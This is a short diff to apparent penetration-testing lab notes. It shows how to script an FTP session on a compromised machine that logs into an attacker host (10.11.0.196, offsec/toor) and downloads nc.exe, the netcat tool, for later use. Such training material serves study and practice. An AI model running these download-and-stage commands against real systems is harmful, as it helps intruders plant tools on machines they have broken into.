@@ -13,16 +13,17 @@ On the compromised machine we echo out the following commands into a file
 cd /root/Documents/scripts
 root@kali:~/Documents/scripts# ./setup-pureFTP.sh
 enter username and password (offsec and toor)
-2.directory (/ftphome) is created , where the file(nc.exe) should be copied 
+2.directory (/ftphome) is created , where the file(nc.exe) should be copied
 ```
 
 ```
-echo open 10.11.0.5 21> ftp.txt
+echo open 10.11.0.196 21> ftp.txt
 echo USER offsec>> ftp.txt
-echo ftp>> ftp.txt
+echo toor>> ftp.txt
 echo bin >> ftp.txt
 echo GET nc.exe >> ftp.txt
 echo bye >> ftp.txt
+ftp -v -n -s:ftp.txt
 
 ftp -v -n -s:ftp.txt
 ```
